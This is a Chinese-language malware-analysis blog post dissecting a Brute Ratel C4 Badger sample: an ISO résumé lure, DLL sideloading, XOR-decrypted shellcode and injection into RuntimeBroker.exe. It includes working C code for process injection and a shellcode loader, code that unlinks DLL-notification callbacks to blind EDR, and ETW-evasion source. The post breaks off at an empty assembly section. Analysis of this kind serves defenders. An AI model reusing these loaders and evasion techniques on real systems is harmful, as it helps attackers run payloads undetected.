---
title: "brute ratel C4 badger全分析文档"
date: 2024-10-25 19:37:08
tags: ["reverse"]
categories: []
---

Brute Ratel C4是一款类似于Cobalt Strike的商业红队武器框架，每年License收费为2500美元，客户需要提供企业电子邮件地址并在颁发许可证之前进行验证，首个版本Brute Ratel C4 v0.2于2021年2月9日发布，它是由Mandiant和CrowdStrike的前红队队员Chetan Nayak创建的，**该工具独特之处在于它专门设计防止端点检测和响应(EDR)和防病毒(AV)软件的检测** ，是一款新型的红队商业对抗性攻击模拟武器。  
**AV（Antivirus）：主要依赖于特征库来检测计算机病毒，杀毒的能力完全取决于其拥有的特征库的更新程度。  
EDR（Endpoint Detection and Response）：是一种网络安全解决方案，专注于监控、检测和响应计算机端点（如桌面计算机、笔记本电脑、服务器等）上的潜在威胁和恶意活动。EDR系统通过收集和分析端点数据来发现异常行为、潜在攻击和漏洞利用。

与Cobalt Strike的Beacon后门类似，Brute Ratel C4允许红队在远程终端主机上部署Badger后门程序，Badger连接回攻击者的命令和控制服务器，接收服务器端的命令执行相关的恶意行为。

样本信息：  
名称: Roshan_CV.iso  
大小: 4839424 字节 (4726 KiB)  
MD5: a7df3462a6dce565064cfe408557c4df  
SHA1: 6b91bfc761fe958c8ac04dd403db284ccc3a530e  
SHA256: 1fc7b0e1054d54ce8f1de0cc95976081c7a85c7926c03172a3ddaa672690042c

## 上线流程

![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/07c68b837c079552676e90161258f6cb-1729856448049-98.png)

## 阶段一：钓鱼过程分析

恶意样本是个iso文件，双击挂载iso，一共有5个文件，除了`Roshan-Bandara_CV_Dialog`这个快捷方式之外其他的文件都是隐藏文件  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/47eca10654eb399cb3ca756310ac2424-1729856442012-96.png)  
恶意样本是个iso文件，双击挂载iso，一共有5个文件，除了`Roshan-Bandara_CV_Dialog`这个快捷方式之外其他的文件都是隐藏文件  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/e5071ccd82e2231a9d60412e24e92438-1729856440676-94.png)  
在箭头处打开隐藏文件显示  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/32eeb556147dee26bc9a8a3f49062519-1729856439731-92.png)  
我们查看Roshan-Bandara_CV_Dialog快捷方式指向的目标`%windir%/system32/cmd.exe /c start OneDriveUpdater.exe`，主要就是调用cmd命令执行了隐藏文件OneDriveUpdater.exe，`cmd.exe /c`命令指定执行完后会自动关闭控制台窗口  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/b36a5bb065f47910fb1b3723dc083741-1729856438461-90.png)  
OneDriveUpdater.exe是Microsoft的数字签名二进制文件，用于将数据从本地计算机同步到云。它不是恶意的，而是被滥用来加载参与者的DLL。执行OneDriveUpdater.exe后，将执行以下操作：  
1.由于Version.dll是OneDriveUpdater.exe的依赖DLL，并且与OneDriveUpdater.exe存在于同一目录中，因此将加载它。  
2.Version.dll已被Actor修改，以加载加密的有效负载文件OneDrive.update。修改解密文件并在内存中加载shellcode的第一阶段。为了维护代码功能，参与者使用DLL API转发请求到名为vresion.dll的合法版本. dll。Vresion.dll是执行元的version.dll的依赖文件，将与执行元的version.dll一起加载。  
使用 Dependencies 查看dll调用情况  
劫持DLL的攻击原理是在DLL搜索顺序的较高优先级位置放置一个恶意DLL，这个恶意DLL具有与目标DLL相同的文件名。当应用程序尝试加载目标DLL时，Windows首先找到并加载恶意DLL，从而在受害进程中执行恶意代码.可以发现，黑dll在白dll前。

![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/a4e6490de03776c2ddf10ddf5dbec37c-1729856435835-88.png)

vresion.dll和OneDriveUpdater.exe为白文件都有Microsoft的有效数字签名  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/2b71c5a2137334540d08bae3306bc489-1729856432872-86.png)  
3.内存中的代码，即Brute Ratel C4，在RuntimeBroker.exe进程空间中作为Windows线程执行  
流程图示：  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/5776527b50daf6feaee6f8220fd30ebf-1729856431404-84.png)

## 阶段二：version.dll分析

![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/83a510491d328891d1e44f9441fddc95-1729856429933-82.png)

Version.dll是用C++编写的合法Microsoft文件的修改版本。植入的代码用于加载和解密加密的有效载荷文件。解密后的有效载荷是shellcode（x64汇编）的有效载荷，该shellcode进一步用于在主机上执行Brute Ratel C4。

为了使Version.dll保持其OneDriveUpdater.exe的代码功能，参与者包括合法的数字签名Microsoft version.dll并将其命名为vresion.dll。任何时候OneDriveUpdater.exe调用Actor的Version.dll，该调用都会被代理到vresion.dll。因此，执行元的version.dll将作为依赖文件加载vresion.dll。![](pic/brute ratel C4 badger/207dbd888060397b38915961d2ebd295.png)  
version.dll和vresion.dll的导出函数完全相同  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/f5c6a091034faec0969bc8e8538d84c1-1729856427178-80.png)

### 任务一：搜寻Runtimebroker.exe进程

唯一调用了一个函数  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/1d81bb1cd055bb342bb0e174e97fb26f-1729856424592-78.png)  
枚举所有进程并循环查找找到Runtimebroker.exe的进程ID（PID）。  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/ce70b8c7e12d139ff850cb8805ba80a8-1729856423132-76.png)![](pic/brute ratel C4 badger/3312f9c1a5325a39f97555c775276624.png)  
附加进程到exe上进行动调  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/de81b62aa5654911e522a7df47dabd4c-1729856419170-74.png)  
从当前工作目录读取负载文件OneDrive.Update。  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/fd20d5ffbdd0190cead78ea82cc35129-1729856417397-72.png)  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/2bf878c91e37b4962c6ebdee9b2088c0-1729856416606-70.png)  
打印字符串`"Please wait..."`  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/d36dbda02a0377c3c39fee09deb9a4bb-1729856415275-68.png)  
使用步骤1中的进程ID调用Windows API ntdll ZwOpenProcess。进程以完全控制访问打开。  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/e15ac68df3e024f43ad15940058fc568-1729856414347-66.png)  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6cf1675f0d2c3c1ba454c055d3ccc780-1729856413093-64.png)

### 任务二：解密shellcode

使用XOR加密算法和28字节密钥对有效负载文件shellcode进行解密：  
jikoewarfkmzsdlhfnuiwaejrpaw  
解密前：  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/72e25230959c6960054aab9adc90367c-1729856409984-62.png)  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/5692889141c7e0f6f12e7dd00227fcc7-1729856409008-60.png)  
解密之后，如下所示：  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/07eab379fe5be645b75c77d0593b4c7c-1729856407847-58.png)  
00007FFFF8142326地址在内存中看，即可看到shellcode  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/457c8e34368eecfa36e4d53cdc3e19b7-1729856406727-56.png)

### 任务三：进程注入

调用了`NtCreateSection`函数创建Section  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/06b99c0756e1c67e1e3af83a57592649-1729856404940-54.png)

接着调用`NtMapViewOfSection`函数将section映射到本进程虚拟内存  
两次调用Windows API NtMapViewOfSection。第一个调用将解密的有效负载的内容映射到当前进程内存空间，第二个调用将内容映射到Runtimebroker.exe内存空间。
    
    
    ZwMapViewOfSection 例程将节的视图映射到主题进程的虚拟地址空间中

![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/4920bb85088a490094d64909b4e41925-1729856402337-52.png)  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/c1c92adae1afbaf673465b43f945341b-1729856401359-50.png)  
调用Windows API NtDelayExecution并休眠（暂停执行)
    
    
    **KeDelayExecutionThread** 例程将当前线程置于指定间隔内可发出警报或不可更改的等待状态。

![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6b0cbeb7b1d61846a2df403461b4e705-1729856399818-48.png)  
**调用Windows API NtcreatThreadEx。此API启动一个新线程，并将内存的起始地址复制到Runtimebroker.exe。 在RuntimeBroker.exe进程中创建远程线程执行注入的shellcode** 这是关键的一步骤。  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/0eb175f114add714a317837612a725e5-1729856397898-46.png)

调用Windows API NtDelayExecution并休眠（暂停执行）  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/ff91394027c12789d3ddbcc253f096ac-1729856396030-44.png)  
随后程序结束  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/bfd68a039a823f91527df5b0f78c8116-1729856394868-42.png)  
接下来的逻辑还是熟悉的通过`PEB-Ldr->InMemoryOrderModuleList`获取ntdll.dll的基址  
version.dll中的加载方法也是如此  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/dad1e4264ce019cf6c2d44ca15969e45-1729856393337-40.png)

### 任务四：将shellcode dump出来

将这段shellcode执行 使用process hacker 工具此时可以在内存中查看到runtimebroker  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/3ccdfeb6f15c9744f17de5d92b1f2ddc-1729856391720-38.png)  
使用其他方法也能查看到  
在内存布局中转到该地址，然后将这块内存转存为文件  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/255e67c99ef9d753ee0d0e6ed291f23d-1729856390304-36.png)  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/96f1b1d0d4f0c465ecc9ebfebf616675-1729856389062-34.png)  
复现：
    
    
    #include <windows.h>
    #include <stdio.h>
    #include <iostream>
    #include <tlhelp32.h>
    
    
    DWORD find_process(  wchar_t *process_name) {
        PROCESSENTRY32 process_entry;
        process_entry.dwSize = sizeof(PROCESSENTRY32);
    
        // Take a snapshot of all processes in the system
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            std::cerr << "CreateToolhelp32Snapshot failed" << std::endl;
            return 0;
        }
    
        // Retrieve information about the first process
        if (Process32First(snapshot, &process_entry) == TRUE) {
            do {
                // Compare the name of the process with the desired process name
               if (_wcsicmp(process_entry.szExeFile, process_name) == 0) {
                    CloseHandle(snapshot);
                    return process_entry.th32ProcessID;
                }
            } while (Process32Next(snapshot, &process_entry) == TRUE);
        }
    
        // Close the snapshot handle
        CloseHandle(snapshot);
        return 0;
    }
    int main(void)
    {
      
         wchar_t  targetThreadName[]=L"RuntimeBroker.exe"; 
        DWORD threadId = find_process(targetThreadName);
        HANDLE hprocess=OpenProcess(PROCESS_ALL_ACCESS,false,threadId);
        HANDLE hFile = CreateFileW(L"shellcode.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        int fileSize = GetFileSize(hFile, NULL);
        LPVOID remote_process_buffer=VirtualAllocEx(hprocess,NULL,sizeof(fileSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        //使用WriteProcessMemory函数将我们的shellcode写入分配的内存区域。
        WriteProcessMemory(hprocess, remote_process_buffer, hFile, fileSize, NULL);
        CreateRemoteThread(hFile, NULL, 0,(LPTHREAD_START_ROUTINE) remote_process_buffer,NULL,0, NULL);
        
        return 0;
    }

## 阶段三：分析shellcode

这个文件的作用是释放Brute Ratel C4 Badger的payload

### 任务一：手动加载shllcode

将dump下来的shellcode.bin文件使用编写的shellcode loader运行
    
    
    #include <windows.h>
    #include <iostream>
    int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)  
    {
    DWORD dwOldProtect = 0;
    
    OVERLAPPED ol = { 0 };
    
    HANDLE hFile = CreateFileW(L"shellcode.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    int fileSize = GetFileSize(hFile, NULL);
    
    LPVOID lpShellCode = VirtualAlloc(NULL, fileSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    
    ReadFileEx(hFile, lpShellCode, fileSize, &ol, NULL);
    
    CloseHandle(hFile);
    
    VirtualProtect(lpShellCode, fileSize, PAGE_EXECUTE_READ, &dwOldProtect);
    
    ((void(*)())lpShellCode)();
    
    WaitForSingleObject((HANDLE)-1, -1);
    
    }

### 任务二：shellcode分析

shellcode开头有巨量的`mov`和`push`执行的组合，通过压入栈中的数据可以判断大致是在初始化数据和函数调用要用到的参数等等  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/ff3cd0cc1cf2275d79a4cc8f2201c8e3-1729856382212-32.png)

通过访问0x3C位置AddressOfNewExeHeader开始解析此PE文件  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/b0ee86796b47c330d10694da07ea7a6e-1729856379208-30.png)  
查看rsp寄存器内存，可以发现压入栈中的众多数据包含了一个PE文件并且此PE文件的Dos头的MZSignature被抹除防止EDR进行内存扫描查杀，  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/1525aaaa197f5466179e180c90a33a9b-1729856377647-28.png)

最终获取导出函数的RVA：0x92E0  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/f845c826fb7095d016e6226e3845d77c-1729856375664-26.png)

通过`PEB-Ldr->InMemoryOrderModuleList`获取ntdll.dll的基址  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/cd6358540000e39df82ed269c5c6f079-1729856372867-24.png)  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6dd3b690783d860fb18a7bce7a3b950f-1729856371428-22.png)  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/b48ff8824a9533e550e30e2b0b45faf4-1729856369783-20.png)  
值得一提的是：  
需要调用api都是通过hash算法获取API的名称然后进行调用的 （加密与解密P557),这样可以提升逆向分析难度，也可以缩小shellcode的体积  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/5f87fe60e97207e05219bc2a8d1dab8c-1729856367920-18.png)

调用searchByHash函数（上述函数重命名）通过Hash获取6个对应函数的地址  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/3c3b87d7263ff3eabb6963437eebd4fe-1729856365920-16.png)

调用NtAllocateVirtualMemory分配指定的内存空间，然后再把payload的ShellCode代码拷贝到该内存空间当中，如下所示：  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/dd418279fd9ab31d56d1c8d55a38cb07-1729856363775-14.png)  
使用Windows API调用NtProtectVirtualMemory更改新分配的内存块的保护。  
调用NtProtectVirtualMemory修改该内存的属性，如下所示：  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/cdb9d88265d399fb1f33f3d3df695f68-1729856362427-12.png)

调用NtCreateThreadEx启动线程代码，如下所示  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6016290aafad449c4706d4de1dc10c28-1729856361182-10.png)调用ZwWaitForSingleObject函数等待线程执行完毕  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/10133dd274e43af0a8694462f571dabf-1729856356145-8.png)

在线程中释放Brute Ratel C4 Badger的攻击载荷，badger与cobalt strike十分相似。在此略去。  
下面这一apt就是相似的攻击链加载cobalt strike载荷  
[响尾蛇组织使用DLL劫持加载Cobalt Strike攻击巴基斯坦政府 - FreeBuf网络安全行业门户](<https://www.freebuf.com/articles/web/368777.html>)

## BRC 4最终有效载荷

### Unregister DLL load callbacks **取消注册DLL加载回调**

> 某些EDR产品可能会在内核级别注册其函数回调，以接收来自DLL加载或卸载事件的遥测。  
> 为了绕过这一点，使用了一种技术，其中注册了一个空的回调函数，该回调函数被添加到已注册回调函数链的末尾。回调列表存储在循环双向链表中，其中最后一个元素指向链中的第一个元素。  
> 通过找到指向链开始的指针，该技术可以遍历列表并取消链接所有已注册的回调，如果EDR已经在内核级别注册了自己的回调函数，则可以有效地抑制EDR接收DLL加载和卸载遥测的尝试
    
    
    // 检索注册回调函数列表的末尾
    end_of_list = (PLDR_DLL_NOTIFICATION_ENTRY)ret_head_of_reg_callback_funcs();
    if (end_of_list)
    {
        // 从列表末尾开始，反向遍历到开头
        for (head = (PLDR_DLL_NOTIFICATION_ENTRY)end_of_list->List.Flink; 
             head != end_of_list; 
             head = flink) // 遍历回调列表，取消节点链接
        {
            flink = (PLDR_DLL_NOTIFICATION_ENTRY)head->List.Flink;
            blink = head->List.Blink;
            // 从列表中取消当前节点的链接
            flink->List.Blink = blink;
            blink->Flink = &flink->List;
            head->List.Flink = 0LL;
            head->List.Blink = 0LL;
        }
    }
    return end_of_list;

这段代码片段遍历了`PLDR_DLL_NOTIFICATION_ENTRY`结构体的双向链表，这些结构体代表注册的DLL加载和卸载事件的回调函数。它从列表中取消每个节点的链接，有效地移除了所有注册的回调。  
![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/f6779ff7924f38d2cb3a6e1deaca7a09-1729856351678-6.png)
    
    
    ```

typedef struct _LDR_DLL_NOTIFICATION_ENTRY {  
LIST_ENTRY List;  
PLDR_DLL_NOTIFICATION_FUNCTION Callback;  
PVOID Context;  
} LDR_DLL_NOTIFICATION_ENTRY, * PLDR_DLL_NOTIFICATION_ENTRY;
    
    
    ```
    
    ```c
    our_callback_cookie = 0LL;
    // 在注册回调函数链的末尾注册一个空回调函数
    if ((int)LdrRegisterDllNotification(0LL, EmptynotificationFunc, 0LL, &our_callback_cookie) >= 0)
    {
        // ...
    }

这里，代码使用`LdrRegisterDllNotification`注册了一个空（或虚拟）回调函数。这个函数被添加到现有回调链的末尾。
    
    
    // ...
    while (ntHdrs->FileHeader.NumberOfSections > (int)i)
    {
        // ...
        if (!(unsigned int)getNullByteAtEndOfName(secHdrs, ".data")) // 检查是否为NULL字节，尝试找到.data节的末尾
        {
            // ...
            // 由于我们的回调在回调列表的末尾，我们反向遍历列表
            // 直到找到我们的回调
            while (our_callback_cookie != entry)
            {
                if (entry >= (PLDR_DLL_NOTIFICATION_ENTRY)secPtrVA && v7 >= (char *)entry)
                {
                    // 注销函数回调
                    LdrUnregisterDllNotification(our_callback_cookie);
                    return (char *)entry;
                }
                // 更新条目以获取列表中的下一个节点
                entry = (PLDR_DLL_NOTIFICATION_ENTRY)entry->List.Flink;
            }
            return 0LL;
        }
        // ...
    }
    return 0LL;

这段代码寻找DLL（ntdll.dll）的PE头中的特定节，并反向遍历注册回调的列表，直到找到它注册的那个回调（使用`our_callback_cookie`）。一旦找到，它就使用`LdrUnregisterDllNotification`注销回调。

  1. **检索回调链尾指针** ：
         
         end_of_list = (PLDR_DLL_NOTIFICATION_ENTRY)ret_head_of_reg_callback_funcs();

这行代码调用一个函数以获取DLL通知回调链的尾指针。

  2. **遍历并取消链接回调** ：  
如果`end_of_list`非空，代码将遍历回调链，并取消每个节点的链接：
         
         for (head = ...; head != end_of_list; head = flink) {
             ...
         }

这里，`List.Flink` 和 `List.Blink` 分别是指向链表中下一个和上一个节点的指针。通过修改这些指针，当前节点从链表中被移除。

  3. **注册空回调函数** ：
         
         LdrRegisterDllNotification(0LL, EmptynotificationFunc, 0LL, &our_callback_cookie);

这行代码使用 `LdrRegisterDllNotification` 函数注册一个空的回调函数 `EmptynotificationFunc`。这个空回调被添加到回调链的末尾，用于后续操作。

  4. **寻找特定DLL的节信息** ：  
代码通过解析PE头（Portable Executable header）来寻找特定DLL（如ntdll.dll）的节信息，特别是`.data`节：
         
         while (ntHdrs->FileHeader.NumberOfSections > (int)i) {
             ...
             if (!(unsigned int)getNullByteAtEndOfName(secHdrs, ".data")) {
                 ...
             }
         }

这可能用于确定特定数据区域的位置。

  5. **反向遍历回调链** ：  
代码使用`our_callback_cookie`作为起始点，反向遍历回调链：
         
         while (our_callback_cookie != entry) {
             ...
         }

目的是找到特定的回调函数或执行某些操作。

  6. **注销回调** ：  
当找到特定的回调时，使用 `LdrUnregisterDllNotification` 函数将其注销：
         
         LdrUnregisterDllNotification(our_callback_cookie);

整个过程的目的是为了清理或修改现有的DLL加载和卸载通知回调，防止EDR产品接收到这些事件的通知。通过这种方式，可以有效地抑制EDR产品对DLL加载和卸载事件的监控，从而绕过某些安全检测机制。

**伪代码：**
    
    
    end_of_list=(PLDR_DLL_NOTIFICATION_ENTRY)ret_head_of_reg_callback_funcs();
    if (end_of_list)
    {
    for (head = (PLDR_DLL_NOTIFICATION_ENTRY)end_of_list->List.Flink; head != end_of_list; head = flink )// walk the list of callbacks, unlinking nodes
    {
    flink = (PLDR_DLL_NOTIFICATION_ENTRY)head->List.Flink;
    blink = head->List.Blink;
    flink->List.Blink = blink;
    blink->Flink = &flink->List;
    head->List.Flink = 0LL;
    head->List.Blink = 0LL;
    }
    }
    return end_of_list;
    
    
    
    our_callback_cookie = 0LL;
    if ((int) LdrRegisterDllNotification (0LL, EmptynotificationFunc, 0LL, &our_callback_cookie) >= 0)// we register our Empty callback at the end of the chain of
    i = 0LL;
    ntHdrs = (IMAGE_NT_HEADERS *) ((char *)ntdll_base_g + ntdll_base_g->e_lfanew);
    while (ntHdrs->FileHeader.NumberOfSections > (int)i)
    {
    v3 = 0x28 * i++;
    // each of the sec headers is 0x28 bytes in size
    sechdrs = (IMAGE_SECTION_HEADER *) ((char *)&ntHdrs->OptionalHeader + ntHdrs->FileHeader.SizeOfOptionalHeader + v3);
    if (!(unsigned int)getNullByteAtEndOfName (secHdrs, ".data") )// chk if NULL byte, trying to find the end of .data section for some reason
    {
    PhysicalAddress = secHdrs->Misc.PhysicalAddress;
    secPtrVA = (char *)ntdll_base_g + sechdrs->VirtualAddress;
    entry = (PLDR_DLL_NOTIFICATION_ENTRY)our_callback_cookie->List.Flink;// head of the list of registered callbacks
    v7 = &secPtrVA[4 + PhysicalAddress];
    while (our_callback_cookie != entry) // since out callback is at the end of the list of callbacks
    // we are walking the list backwards untill we hit our callback
    {
    if (entry >= (PLDR_DLL_NOTIFICATION_ENTRY)secPtrVA && v7 >= (char *)entry )
    {
    LdrUnregisterDllNotification(our_callback_cookie); // unreg a func callback
    return (char *)entry;
    }
    entry = (PLDR_DLL_NOTIFICATION_ENTRY)entry->List.Flink; // update entry to get the next node in the list
    }
    return 0LL;
    }
    }
    return 0LL;

dll callback injection：  
<https://www.cnblogs.com/zha0gongz1/p/17633377.html>  
<https://shorsec.io/blog/dll-notification-injection/>  
项目  
<https://github.com/ShorSec/DllNotificationInjection>

### **代理DLL加载以隐藏ETWTI堆栈跟踪** Proxying DLL Loads To Hide From ETWTI Stack Tracing

![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6d5695362c23eadf85a83b6dc77b0f7a-1729856342755-4.png)  
<https://github.com/paranoidninja/Proxy-DLL-Loads>  
<https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/>

> 这里的检测技术非常聪明。一些EDR使用用户态钩子，而另一些则使用ETW来捕获堆栈遥测。例如，假设你想在没有模块踩踏的情况下执行你的shellcode。因此，您通过VirtualAlloc或相对的NTAPI NtAllocateVirtualMemory分配一些内存，然后复制您的shellcode并执行它。现在您的shellcode可能有自己的依赖项，它可能会调用`LoadLibraryA`或`LdrLoadDll`将dll从磁盘加载到内存中。如果你的EDR使用userland钩子，它们可能已经钩住`了LoadLibrary`和`LdrLoadDll`，在这种情况下，它们可以检查由RX shellcode区域压入堆栈的返回地址。这是特定于一些EDR像哨兵一号，Crowdstrike等，这将立即杀死你的有效载荷。 其他EDR，如Microsoft Defender ATP（MDATP），Elastic，FortiEDR将使用ETW或内核回调来检查`LoadLibrary`调用的来源。堆栈跟踪将提供返回地址的完整堆栈帧以及从那里开始调用`LoadLibrary`的所有函数。 简而言之，如果你执行一个DLL Sideload，它执行你的shellcode，调用`LoadLibrary`，它看起来像这样：  
> ![](/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/f96083f569a4308667d26affa7ae5f3f-1729856473040-100.png)  
> 这意味着任何在用户模式下或通过内核回调/ETW挂接`LoadLibrary的`EDR都可以检查最后一个返回地址区域或调用的来源。在[BRc 4的v1.1版本](<https://bruteratel.com/release/2022/07/20/Release-Stoffels-Escape/>)中，我开始使用`RtlRegisterWait`API，它可以请求线程池中的工作线程在单独的线程中执行`LoadLibraryA`来加载库。一旦库被加载，我们可以通过简单地遍历PEB（进程环境块)来提取其基址。Nighthawk后来将此技术应用于`RtlWorkItem`API，它是`WorkUserWorkItem`背后的主要NTAPI，也可以将请求排队到工作线程以加载具有干净堆栈的库。然而，Proofpoint在去年的某个时候在他们的博客中对此进行了研究，最近Elastic的Joe Desimone也发布了一条关于BRc 4使用的`RtlRegisterWait`API的推文。 这意味着迟早会被检测到，并且需要更多这样的API来进一步规避。因此，我决定花一些时间从ntdll中反转一些未文档化的API，并发现至少`有27个不同的回调`，只要稍加调整和黑客攻击，就可以利用它们来加载我们的DLL。

简而言之：就是在一个单独的，“干净的线程”中使用loadlibraryA

**下面是项目源代码：**  
`TpPostWork`调用`WorkCallback`，但`WorkCallback`不调用`LoadLibraryA`，而是跳转到它的指针。`WorkCallback`简单地将`RDX`寄存器中的库名称移动到`RCX`，擦除`RDX`，从adhoc函数获取`LoadLibraryA`的地址，然后跳转到`LoadLibraryA`，这最终重新排列整个堆栈帧，而不添加我们的返回地址。
    
    
    #include <windows.h>
    #include <stdio.h>
    
    typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
    typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
    typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);
    
    FARPROC pLoadLibraryA;
    
    UINT_PTR getLoadLibraryA() {
        return (UINT_PTR)pLoadLibraryA;
    }
    
    extern VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    
    int main() {
        pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA");
        FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpAllocWork");
        FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpPostWork");
        FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpReleaseWork");
    
        CHAR *libName = "wininet.dll";
        PTP_WORK WorkReturn = NULL;
        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback, libName, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    
        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("hWininet: %p\n", GetModuleHandleA(libName));
    
        return 0;
    }

**** 通过操作堆栈帧将WorkCallback重新路由到LoadLibrary的ASM代码
    
    
    section .text
    
